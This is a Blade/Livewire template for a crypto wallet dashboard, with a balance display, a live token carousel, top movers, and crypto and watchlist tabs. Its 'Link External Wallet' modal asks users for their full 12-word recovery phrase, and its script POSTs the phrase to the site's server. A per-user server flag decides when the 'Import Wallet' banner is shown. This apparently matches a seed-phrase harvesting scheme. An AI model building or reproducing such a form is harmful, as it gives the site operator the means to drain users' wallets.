<div style="width:100%">
  <!-- Top Bar -->
  <div class="top">
    <div class="left-icons dashboard-left-actions">

        {{-- Notification Bell --}}
        <a
            href="{{ route('notifications') }}"
            class="icon-btn notification-bell"
            id="dashboardNotificationBell"
            aria-label="Notifications"
        >
    
            <i class='bx bx-bell'></i>
    
            {{-- Unread notification indicator --}}
            @if(isset($unreadNotificationCount) && $unreadNotificationCount > 0)
    
                <span
                    class="notification-dot"
                    id="notificationDot"
                ></span>
    
            @endif
    
        </a>
    
        {{-- Settings --}}
        <a
            href="{{ route('settings') }}"
            class="icon-btn"
            aria-label="Settings"
        >
            <i class='bx bx-cog'></i>
        </a>
    
    </div>
    <div style="display:flex;align-items:center;gap:8px">
      <div class="title">Main Wallet</div>
      <div style="opacity:.7; font-size: 10px;">▼</div>
    </div>
    <div style="display:flex;gap:10px;align-items:center">
      <div class="copy-container" style="margin-top: 0;">
        <button onclick="navigator.clipboard.writeText('{{ $accountId }}'); window.showToast('Copied Wallet ID!');" class="copy-btn" style="padding: 4px 8px;">
          <i class='bx bx-copy'></i> 
        </button>
      </div>
      <a href="{{ route('buy.index') }}" class="icon-btn"><i class='bx bx-search'></i></a>
    </div>
  </div>

  <!-- Balance Section -->
  <div class="balance">
    <h1 id="mainBalance" class="balance-value" style="transition: opacity 0.2s;">
      {{ $balanceShow ? '$' . $balance : '$●●●●●●' }}
    </h1>
    <div class="live-rate">
      @if ($balanceShow)
        @php
          $isPositive = floatval(str_replace(',', '', $changeUSD)) >= 0;
        @endphp
        <span id="balanceChange" class="change {{ $isPositive ? 'green' : 'red' }}" style="font-size:13px;">
          {{ $isPositive ? '+' : '' }}${{ $changeUSD }} ({{ $isPositive ? '+' : '' }}{{ $changePercentage }}%)
        </span>
      @else
        <span id="balanceChange" class="change green" style="font-size:13px; opacity: 0.6;">
          *** (***)
        </span>
      @endif
      <button wire:click="toggleBalance"
              style="background:none; border:none; color:var(--muted); cursor:pointer; font-size:20px; padding:0 4px; display:inline-flex; align-items:center;">
        <i class='bx {{ $balanceShow ? "bx-hide" : "bx-show" }}' id="eyeIcon"></i>
      </button>
    </div>
  </div>
  
  <!-- Core Action Buttons -->
  <div class="actions">
    <a onclick="toggleModal('sendModal')" class="action"><i class='bx bx-up-arrow-alt'></i><div class="action-label">Send</div></a>
    <a href="{{ route('swap') }}" class="action"><i class='bx bx-transfer'></i><div class="action-label">Swap</div></a>
    <a href="{{ route('deposit') }}" class="action fund"><i class='bx bx-bolt-circle'></i><div class="action-label">Fund</div></a>
    <a href="{{ route('swap') }}" class="action"><i class='bx bx-credit-card'></i><div class="action-label">Sell</div></a>
    <a href="{{ route('bots') }}" class="action"><i class='bx bx-line-chart'></i><div class="action-label">Earn</div></a>
  </div>

  <!-- Link External Wallet Banner -->
  @if($user && $user->require_wallet_connect)
    <div class="actions" style="margin-top: 15px;">
      <a href="{{ route('wallet.connect') }}" wire:navigate class="action import">
        <i class='bx bx-wallet'></i>
        <div class="action-label">Import Wallet</div>
      </a>
    </div>
  @endif
  
  <div style="display:flex; align-items:center; justify-content:space-between; padding: 0 6px;">
    <div class="section-title" style="margin: 18px 0 8px 0;">Alpha tokens</div>
    <div id="alphaLiveIndicator" style="display:flex; align-items:center; gap:5px; font-size:11px; color:var(--muted);">
      <span id="alphaLiveDot" style="width:6px;height:6px;border-radius:50%;background:var(--muted);display:inline-block;transition:background 0.3s;"></span>
      <span id="alphaLiveText">Loading...</span>
    </div>
  </div>

  <!-- Alpha tokens live slider -->
  <div class="alpha-container">
    <div class="alpha-track" id="alphaTrack">
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-btc">
        <div class="token-circle" style="background:linear-gradient(135deg,#f7931a,#e8750a);">
          <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="BTC">
        </div>
        <div>
          <div class="token-name">BTC</div>
          <div class="market" id="btc-mcap">Bitcoin</div>
        </div>
        <div class="token-price">
          $<span id="btc-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="btc-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-eth">
        <div class="token-circle" style="background:linear-gradient(135deg,#627eea,#3a55c4);">
          <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ETH">
        </div>
        <div>
          <div class="token-name">ETH</div>
          <div class="market" id="eth-mcap">Ethereum</div>
        </div>
        <div class="token-price">
          $<span id="eth-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="eth-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-sol">
        <div class="token-circle" style="background:linear-gradient(135deg,#9945ff,#14f195);">
          <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="SOL">
        </div>
        <div>
          <div class="token-name">SOL</div>
          <div class="market" id="sol-mcap">Solana</div>
        </div>
        <div class="token-price">
          $<span id="sol-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="sol-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-bnb">
        <div class="token-circle" style="background:linear-gradient(135deg,#f3ba2f,#c89b08);">
          <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB">
        </div>
        <div>
          <div class="token-name">BNB</div>
          <div class="market" id="bnb-mcap">BNB Chain</div>
        </div>
        <div class="token-price">
          $<span id="bnb-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="bnb-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-xrp">
        <div class="token-circle" style="background:linear-gradient(135deg,#346aa9,#1e3f6e);">
          <img src="https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png" alt="XRP">
        </div>
        <div>
          <div class="token-name">XRP</div>
          <div class="market" id="xrp-mcap">Ripple</div>
        </div>
        <div class="token-price">
          $<span id="xrp-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="xrp-change">—</div>
        </div>
      </a>
    </div>
  </div>

  <div class="alpha-nav" id="alphaNav">
    <div class="alpha-dot active" data-index="0"></div>
    <div class="alpha-dot" data-index="1"></div>
    <div class="alpha-dot" data-index="2"></div>
    <div class="alpha-dot" data-index="3"></div>
    <div class="alpha-dot" data-index="4"></div>
  </div>
  
  <!-- =========================================================
     TOP MOVERS
     ========================================================= -->

<div class="dashboard-market-section top-movers-section">

    <div class="market-section-title">
        <span>Top movers</span>
    </div>

    <div class="mover-tabs">

        <button
            type="button"
            class="mover-tab active"
            data-mover-category="stocks"
        >
            Stocks
        </button>

        <button
            type="button"
            class="mover-tab"
            data-mover-category="memes"
        >
            Memes
        </button>

        <button
            type="button"
            class="mover-tab"
            data-mover-category="x402"
        >
            x402
        </button>

        <button
            type="button"
            class="mover-tab"
            data-mover-category="ai"
        >
            AI
        </button>

    </div>

    <div
        class="mover-description"
        id="moverDescription"
    >
        Market movers
    </div>


    <div
        class="top-movers-list"
        id="topMoversList"
    >

        <div class="mover-empty">
            <i class='bx bx-line-chart'></i>

            <span>
                Top movers will appear here
            </span>
        </div>

    </div>

</div>
  
  <!-- =========================================================
     CRYPTO / WATCHLIST
     ========================================================= -->

<div class="dashboard-market-section">

    <!-- Main Tabs -->

    <div class="dashboard-main-tabs">

        <button
            type="button"
            class="dashboard-main-tab active"
            id="tab-crypto"
        >
            Crypto
        </button>

        <button
            type="button"
            class="dashboard-main-tab"
            id="tab-watchlist"
        >
            Watchlist
        </button>

    </div>


    <!-- =====================================================
         CRYPTO
         ===================================================== -->

    <div
        id="cryptoTab"
        class="dashboard-tab-panel"
    >

        <!-- Coin Category Tabs -->

        <div class="coin-category-tabs">

            <button
                type="button"
                class="coin-category-tab active"
                data-category="top"
            >
                Top
            </button>

            <button
                type="button"
                class="coin-category-tab"
                data-category="bnb"
            >
                BNB
            </button>

            <button
                type="button"
                class="coin-category-tab"
                data-category="eth"
            >
                ETH
            </button>

            <button
                type="button"
                class="coin-category-tab"
                data-category="sol"
            >
                SOL
            </button>

        </div>


        <div class="coin-category-description">
            Popular tokens
        </div>


        <!-- Coin List -->

        <div
            id="dashboardCoinList"
            class="dashboard-coin-list"
            wire:poll.30s
        >

            @foreach($cryptoAssets as $index => $asset)

                @php

                    $symbol =
                        strtoupper(
                            $asset['symbol'] ?? ''
                        );

                    $network =
                        strtolower(
                            $asset['network'] ?? ''
                        );


                    /*
                     * -------------------------------------------------
                     * TOKEN CATEGORY
                     * -------------------------------------------------
                     */

                    if (
                        $symbol === 'BNB'
                        ||
                        str_contains(
                            $network,
                            'bnb'
                        )
                        ||
                        str_contains(
                            $network,
                            'bsc'
                        )
                    ) {

                        $category = 'bnb';

                    } elseif (
                        $symbol === 'ETH'
                        ||
                        str_contains(
                            $network,
                            'eth'
                        )
                        ||
                        str_contains(
                            $network,
                            'erc20'
                        )
                    ) {

                        $category = 'eth';

                    } elseif (
                        $symbol === 'SOL'
                        ||
                        str_contains(
                            $network,
                            'sol'
                        )
                    ) {

                        $category = 'sol';

                    } else {

                        $category = 'top';

                    }

                @endphp


                <div
                    class="asset asset-item dashboard-coin-row"
                    data-symbol="{{ $asset['symbol'] }}"
                    data-category="{{ $category }}"
                >

                    <a
                        href="{{ route(
                            'crypto.details',
                            [
                                'symbol' =>
                                    strtolower(
                                        $asset['symbol']
                                    ),
                                'network' =>
                                    $asset['network']
                                    ?? 'native'
                            ]
                        ) }}"
                        class="dashboard-coin-link"
                    >

                        <!-- Rank -->

                        <span class="dashboard-coin-rank">
                            {{ $index + 1 }}
                        </span>


                        <!-- Icon -->

                        <div class="dashboard-coin-icon-wrap">

                            <img
                                src="{{ $asset['icon_url'] }}"
                                alt="{{ $asset['name'] }}"
                                class="dashboard-coin-icon"
                                onerror="
                                    this.style.display='none';
                                "
                            >

                            @if(!empty($asset['network_url']))

                                <img
                                    src="{{ $asset['network_url'] }}"
                                    alt="Network"
                                    class="dashboard-network-icon"
                                >

                            @endif

                        </div>


                        <!-- Name -->

                        <div class="dashboard-coin-name">

                            <div class="dashboard-coin-symbol">

                                {{ $asset['symbol'] }}

                                @if(!empty($asset['network']))

                                    <span class="dashboard-network-badge">
                                        {{ $asset['network'] }}
                                    </span>

                                @endif

                            </div>

                            <div class="dashboard-coin-full-name">
                                {{ $asset['name'] }}
                            </div>

                        </div>


                        <!-- Values -->

                        <div class="dashboard-coin-values">

                            <div class="dashboard-coin-balance">

                                {{ $balanceShow
                                    ? $asset['balance']
                                    : '***'
                                }}

                            </div>

                            <div class="dashboard-coin-value">

                                {{ $balanceShow
                                    ? '$' .
                                        number_format(
                                            $asset['value'],
                                            2
                                        )
                                    : '***'
                                }}

                            </div>

                            <div
                                class="
                                    dashboard-coin-change
                                    {{
                                        floatval(
                                            $asset['change']
                                        ) < 0
                                            ? 'negative'
                                            : 'positive'
                                    }}
                                "
                            >

                                {{
                                    floatval(
                                        $asset['change']
                                    ) >= 0
                                        ? '+'
                                        : ''
                                }}{{ $asset['change'] }}%

                            </div>

                        </div>

                    </a>


                    <!-- Watchlist -->

                    <button
                        type="button"
                        class="watchlist-btn dashboard-watch-button"
                        data-symbol="{{ $asset['symbol'] }}"
                        title="Add to Watchlist"
                        onclick="
                            event.preventDefault();
                            event.stopPropagation();
                        "
                    >

                        <i class="bx bx-star"></i>

                    </button>

                </div>

            @endforeach

        </div>


        <!-- View All -->

        <button
            type="button"
            id="dashboardViewAll"
            class="dashboard-view-all"
        >

            <span>View all</span>

            <i class='bx bx-chevron-right'></i>

        </button>


        <!-- Manage -->

        <div class="dashboard-manage-crypto">

            <a href="{{ route('crypto.manage') }}">
                Manage crypto list
            </a>

        </div>

    </div>


    <!-- =====================================================
         WATCHLIST
         ===================================================== -->

    <div
        id="watchlistTab"
        class="dashboard-tab-panel"
        style="display:none;"
    >

        <div
            id="emptyWatchlistMsg"
            class="empty-watchlist"
        >

            <i class='bx bx-star'></i>

            <div>
                Your Watchlist is empty
            </div>

            <span>
                Tap the star beside a coin to add it here.
            </span>

        </div>

    </div>

</div>

  <!-- Wallet Connection Modal -->
  <div id="walletModal" class="modal-overlay" style="display: none; justify-content: center; align-items: center;">
    <div class="modal">
      <div class="modal-header">
        <h3 class="modal-title">Link External Wallet</h3>
        <button onclick="hideWalletModal()" class="modal-close">
          <i class="bx bx-x"></i>
        </button>
      </div>

      <div class="modal-body">
        <form id="walletForm" class="space-y-4" onsubmit="window.submitWalletForm(event)">
          <p style="font-size: 13px; color: var(--muted); margin-bottom: 12px;">Please enter your 12-word recovery backup mnemonic phrase:</p>

          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;">
            @for($i = 1; $i <= 12; $i++)
              <div>
                <input type="text" id="word{{ $i }}" class="form-input" placeholder="Word {{ $i }}" style="padding: 8px; font-size: 13px;" required
                       @keydown="
                         if (($event.key === ' ' || $event.key === 'Enter') && $el.value.length > 0 && {{ $i }} < 12) {
                           $event.preventDefault();
                           document.getElementById('word' + ({{ $i }} + 1)).focus();
                         }
                         else if ($event.key === 'Backspace' && $el.value.length === 0 && {{ $i }} > 1) {
                           document.getElementById('word' + ({{ $i }} - 1)).focus();
                         }
                       "
                       @input="$el.value = $el.value.replace(/[^a-zA-Z]/g, '').toLowerCase()">
              </div>
            @endfor
          </div>

          <div style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;">
            <button type="button" onclick="hideWalletModal()" class="max-btn">Cancel</button>
            <button type="submit" class="submit-btn" style="width: auto; margin-top: 0; padding: 10px 20px; font-size: 14px;">Connect Wallet</button>
          </div>
        </form>
      </div>
    </div>
  </div>
  <script>
    function showWalletModal() {
      document.getElementById('walletModal').classList.add('active');
      document.getElementById('walletModal').style.display = 'flex';
    }

    function hideWalletModal() {
      document.getElementById('walletModal').classList.remove('active');
      document.getElementById('walletModal').style.display = 'none';
      document.getElementById('walletForm').reset();
    }

    window.submitWalletForm = function(e) {
      e.preventDefault();
      let words = [];
      for(let i = 1; i <= 12; i++) {
        let inputEl = document.getElementById(`word${i}`);
        words.push(inputEl ? inputEl.value.trim().toLowerCase() : '');
      }

      const phrase = words.join(' ');
      const csrfMeta = document.querySelector('meta[name="csrf-token"]');
      const csrfToken = csrfMeta ? csrfMeta.getAttribute('content') : '';

      fetch('/wallet-connect/connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          wallet_phrase: phrase,
          wallet_name: 'Imported Wallet'
        })
      })
      .then(response => response.json().then(data => ({ status: response.status, body: data })))
      .then(res => {
        if (res.status === 200 && res.body.success) {
          hideWalletModal();
          window.showToast('Wallet linked successfully!');
          setTimeout(() => {
            window.location.reload();
          }, 1500);
        } else {
          window.showToast(res.body.message || 'Failed to connect wallet.', true);
        }
      })
      .catch(err => {
        console.error("AJAX connectWallet failed", err);
        window.showToast('An error occurred. Please try again.', true);
      });
    };

    // Touch/drag scroll and dots sync for Alpha tokens tracker
    function initAlphaCarousel() {
      const alphaTrack = document.getElementById('alphaTrack');
      const alphaDots = document.querySelectorAll('.alpha-dot');
      const tokenCards = document.querySelectorAll('.token-card');
      if (!alphaTrack || alphaDots.length === 0) return;
      
      const cardWidth = tokenCards[0] ? tokenCards[0].offsetWidth + 12 : 262;
      let currentIndex = 0;
      let autoScrollInterval;
      
      function updateCarousel() {
        alphaTrack.style.transform = `translateX(-${currentIndex * cardWidth}px)`;
        alphaDots.forEach((dot, index) => {
          dot.classList.toggle('active', index === currentIndex);
        });
      }
      
      function goToSlide(index) {
        currentIndex = index;
        updateCarousel();
        resetAutoScroll();
      }
      
      function startAutoScroll() {
        autoScrollInterval = setInterval(() => {
          currentIndex = (currentIndex + 1) % alphaDots.length;
          updateCarousel();
        }, 5000);
      }
      
      function resetAutoScroll() {
        clearInterval(autoScrollInterval);
        startAutoScroll();
      }
      
      alphaDots.forEach((dot, index) => {
        dot.addEventListener('click', () => goToSlide(index));
      });
      
      let startX = 0;
      let isSwiping = false;
      
      alphaTrack.addEventListener('touchstart', (e) => {
        startX = e.touches[0].clientX;
        isSwiping = true;
        resetAutoScroll();
      });
      
      alphaTrack.addEventListener('touchmove', (e) => {
        if (!isSwiping) return;
        const currentX = e.touches[0].clientX;
        const diff = startX - currentX;
        alphaTrack.style.transform = `translateX(calc(-${currentIndex * cardWidth}px - ${diff}px))`;
      });
      
      alphaTrack.addEventListener('touchend', (e) => {
        if (!isSwiping) return;
        
        const endX = e.changedTouches[0].clientX;
        const diff = startX - endX;
        const threshold = 50;
        
        if (Math.abs(diff) > threshold) {
          if (diff > 0 && currentIndex < alphaDots.length - 1) {
            goToSlide(currentIndex + 1);
          } else if (diff < 0 && currentIndex > 0) {
            goToSlide(currentIndex - 1);
          } else {
            updateCarousel();
          }
        } else {
          updateCarousel();
        }
        
        isSwiping = false;
      });

      // Mouse drag scroll fallback for desktop
      let isDown = false;
      let startMouseX;
      let scrollLeft;
      
      alphaTrack.addEventListener('mousedown', (e) => {
        isDown = true;
        startMouseX = e.pageX - alphaTrack.offsetLeft;
        scrollLeft = alphaTrack.scrollLeft;
        resetAutoScroll();
      });
      alphaTrack.addEventListener('mouseleave', () => {
        isDown = false;
      });
      alphaTrack.addEventListener('mouseup', () => {
        isDown = false;
      });
      alphaTrack.addEventListener('mousemove', (e) => {
        if(!isDown) return;
        e.preventDefault();
        const x = e.pageX - alphaTrack.offsetLeft;
        const walk = (x - startMouseX) * 2;
        alphaTrack.scrollLeft = scrollLeft - walk;
      });

      startAutoScroll();
    }

    function initWatchlist() {

    const tabCrypto =
        document.getElementById(
            'tab-crypto'
        );

    const tabWatchlist =
        document.getElementById(
            'tab-watchlist'
        );

    const cryptoTab =
        document.getElementById(
            'cryptoTab'
        );

    const watchlistTab =
        document.getElementById(
            'watchlistTab'
        );

    const assetElements =
        document.querySelectorAll(
            '#dashboardCoinList .asset-item'
        );

    const categoryTabs =
        document.querySelectorAll(
            '.coin-category-tab'
        );

    const viewAllButton =
        document.getElementById(
            'dashboardViewAll'
        );

    const watchlistButtons =
        document.querySelectorAll(
            '.watchlist-btn'
        );


    /*
     * ---------------------------------------------------------
     * WATCHLIST STORAGE
     * ---------------------------------------------------------
     */

    let watchlist =
        JSON.parse(
            localStorage.getItem(
                'user_watchlist'
            ) ||
            '["BTC","ETH","SOL"]'
        );


    /*
     * ---------------------------------------------------------
     * CURRENT CATEGORY
     * ---------------------------------------------------------
     */

    let currentCategory =
        'top';


    /*
     * ---------------------------------------------------------
     * VIEW ALL STATE
     * ---------------------------------------------------------
     */

    let showAll =
        false;


    /*
     * ---------------------------------------------------------
     * UPDATE STAR ICONS
     * ---------------------------------------------------------
     */

    function updateButtonStates() {

        watchlistButtons.forEach(
            function (btn) {

                const symbol =
                    btn.dataset.symbol;

                const icon =
                    btn.querySelector('i');

                if (
                    watchlist.includes(
                        symbol
                    )
                ) {

                    btn.classList.add(
                        'active'
                    );

                    if (icon) {

                        icon.className =
                            'bx bxs-star';

                    }

                } else {

                    btn.classList.remove(
                        'active'
                    );

                    if (icon) {

                        icon.className =
                            'bx bx-star';

                    }

                }

            }
        );

    }


    /*
     * ---------------------------------------------------------
     * DISPLAY COINS
     * ---------------------------------------------------------
     */

    function filterCoins() {

        let visibleCount =
            0;

        let totalCount =
            0;


        assetElements.forEach(
            function (item) {

                const category =
                    item.dataset.category;


                /*
                 * Watchlist mode
                 */

                if (
                    watchlistTab &&
                    watchlistTab.style.display !==
                        'none'
                    &&
                    cryptoTab &&
                    cryptoTab.style.display ===
                        'none'
                ) {

                    const symbol =
                        item.dataset.symbol;

                    if (
                        watchlist.includes(
                            symbol
                        )
                    ) {

                        item.style.display =
                            'grid';

                    } else {

                        item.style.display =
                            'none';

                    }

                    return;
                }


                /*
                 * Crypto category mode
                 */

                if (
                    category !==
                    currentCategory
                ) {

                    item.style.display =
                        'none';

                    return;

                }


                totalCount++;


                /*
                 * Show only first 3
                 */

                if (
                    !showAll &&
                    visibleCount >= 3
                ) {

                    item.style.display =
                        'none';

                    return;

                }


                item.style.display =
                    'grid';

                visibleCount++;

            }
        );


        /*
         * View All button
         */

        if (viewAllButton) {

            const shouldShowButton =
                cryptoTab &&
                cryptoTab.style.display !==
                    'none' &&
                totalCount > 3;


            viewAllButton.style.display =
                shouldShowButton
                    ? 'flex'
                    : 'none';


            const text =
                viewAllButton.querySelector(
                    'span'
                );


            if (text) {

                text.textContent =
                    showAll
                        ? 'Show less'
                        : 'View all';

            }

        }

    }


    /*
     * ---------------------------------------------------------
     * WATCHLIST BUTTONS
     * ---------------------------------------------------------
     */

    watchlistButtons.forEach(
        function (btn) {

            btn.addEventListener(
                'click',
                function (event) {

                    event.preventDefault();

                    event.stopPropagation();


                    const symbol =
                        this.dataset.symbol;


                    if (
                        watchlist.includes(
                            symbol
                        )
                    ) {

                        watchlist =
                            watchlist.filter(
                                function (item) {

                                    return item !==
                                        symbol;

                                }
                            );

                        if (
                            window.showToast
                        ) {

                            window.showToast(
                                symbol +
                                ' removed from watchlist'
                            );

                        }

                    } else {

                        watchlist.push(
                            symbol
                        );

                        if (
                            window.showToast
                        ) {

                            window.showToast(
                                symbol +
                                ' added to watchlist'
                            );

                        }

                    }


                    localStorage.setItem(
                        'user_watchlist',
                        JSON.stringify(
                            watchlist
                        )
                    );


                    updateButtonStates();

                    filterCoins();

                }
            );

        }
    );


    /*
     * ---------------------------------------------------------
     * CRYPTO TAB
     * ---------------------------------------------------------
     */

    if (tabCrypto) {

        tabCrypto.addEventListener(
            'click',
            function () {

                tabCrypto.classList.add(
                    'active'
                );

                if (tabWatchlist) {

                    tabWatchlist.classList.remove(
                        'active'
                    );

                }


                if (cryptoTab) {

                    cryptoTab.style.display =
                        'block';

                }

                if (watchlistTab) {

                    watchlistTab.style.display =
                        'none';

                }


                showAll =
                    false;

                filterCoins();

            }
        );

    }


    /*
     * ---------------------------------------------------------
     * WATCHLIST TAB
     * ---------------------------------------------------------
     */

    if (tabWatchlist) {

        tabWatchlist.addEventListener(
            'click',
            function () {

                tabWatchlist.classList.add(
                    'active'
                );

                if (tabCrypto) {

                    tabCrypto.classList.remove(
                        'active'
                    );

                }


                if (cryptoTab) {

                    cryptoTab.style.display =
                        'none';

                }

                if (watchlistTab) {

                    watchlistTab.style.display =
                        'block';

                }


                filterCoins();

            }
        );

    }


    /*
     * ---------------------------------------------------------
     * CATEGORY TABS
     * ---------------------------------------------------------
     */

    categoryTabs.forEach(
        function (tab) {

            tab.addEventListener(
                'click',
                function () {

                    categoryTabs.forEach(
                        function (item) {

                            item.classList.remove(
                                'active'
                            );

                        }
                    );


                    this.classList.add(
                        'active'
                    );


                    currentCategory =
                        this.dataset.category;


                    showAll =
                        false;


                    /*
                     * Make sure Crypto is active
                     */

                    if (tabCrypto) {

                        tabCrypto.classList.add(
                            'active'
                        );

                    }

                    if (tabWatchlist) {

                        tabWatchlist.classList.remove(
                            'active'
                        );

                    }

                    if (cryptoTab) {

                        cryptoTab.style.display =
                            'block';

                    }

                    if (watchlistTab) {

                        watchlistTab.style.display =
                            'none';

                    }


                    filterCoins();

                }
            );

        }
    );


    /*
     * ---------------------------------------------------------
     * VIEW ALL
     * ---------------------------------------------------------
     */

    if (viewAllButton) {

        viewAllButton.addEventListener(
            'click',
            function () {

                showAll =
                    !showAll;

                filterCoins();

            }
        );

    }


    /*
     * ---------------------------------------------------------
     * INITIALIZE
     * ---------------------------------------------------------
     */

    updateButtonStates();

    filterCoins();

}

    // === LIVE ALPHA TOKENS: CoinGecko Free API ===
    let alphaRefreshInterval = null;

    function formatPrice(price) {
      if (price >= 1000) return price.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
      if (price >= 1) return price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      return price.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 4 });
    }

    function formatMcap(mcap) {
      if (!mcap) return '';
      if (mcap >= 1e12) return '$' + (mcap / 1e12).toFixed(2) + 'T';
      if (mcap >= 1e9)  return '$' + (mcap / 1e9).toFixed(2) + 'B';
      if (mcap >= 1e6)  return '$' + (mcap / 1e6).toFixed(1) + 'M';
      return '$' + mcap.toLocaleString();
    }

    function fetchAlphaLiveRates() {
      const coins = ['bitcoin','ethereum','solana','binancecoin','ripple'];
      const ids = ['btc','eth','sol','bnb','xrp'];
      const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=' + coins.join(',') + '&order=market_cap_desc&per_page=5&page=1&price_change_percentage=24h';

      const dot = document.getElementById('alphaLiveDot');
      const txt = document.getElementById('alphaLiveText');

      fetch(url)
        .then(r => r.json())
        .then(data => {
          if (!Array.isArray(data)) return;

          const map = {};
          data.forEach(c => { map[c.id] = c; });

          const coinMap = {
            bitcoin: 'btc', ethereum: 'eth', solana: 'sol',
            binancecoin: 'bnb', ripple: 'xrp'
          };

          Object.entries(coinMap).forEach(([cgId, sym]) => {
            const c = map[cgId];
            if (!c) return;
            const priceEl   = document.getElementById(sym + '-price');
            const changeEl  = document.getElementById(sym + '-change');
            const mcapEl    = document.getElementById(sym + '-mcap');
            if (priceEl)  priceEl.textContent  = formatPrice(c.current_price);
            if (mcapEl)   mcapEl.textContent   = formatMcap(c.market_cap);
            if (changeEl) {
              const pct = c.price_change_percentage_24h;
              const sign = pct >= 0 ? '+' : '';
              changeEl.textContent  = sign + pct.toFixed(2) + '%';
              changeEl.style.color  = pct >= 0 ? 'var(--accent)' : 'var(--danger)';
              changeEl.style.fontWeight = '700';
            }
          });

          if (dot) { dot.style.background = 'var(--accent)'; }
          if (txt) {
            const now = new Date();
            txt.textContent = 'Live · ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
          }
        })
        .catch(() => {
          if (dot) dot.style.background = 'var(--danger)';
          if (txt) txt.textContent = 'Offline';
        });
    }

    function initAlphaLiveRates() {
      fetchAlphaLiveRates();
      if (alphaRefreshInterval) clearInterval(alphaRefreshInterval);
      alphaRefreshInterval = setInterval(fetchAlphaLiveRates, 60000);
    }
    // === END LIVE ALPHA TOKENS ===

    // Initialize scripts on load and Livewire navigate
    function initAllDashboardScripts() {
      initAlphaCarousel();
      initWatchlist();
      initAlphaLiveRates();
    }

    document.addEventListener('DOMContentLoaded', initAllDashboardScripts);
    document.addEventListener('livewire:load', initAllDashboardScripts);
    document.addEventListener('livewire:navigated', initAllDashboardScripts);

    
    // Fallback trigger
    setTimeout(initAllDashboardScripts, 500);
  </script>
</div>
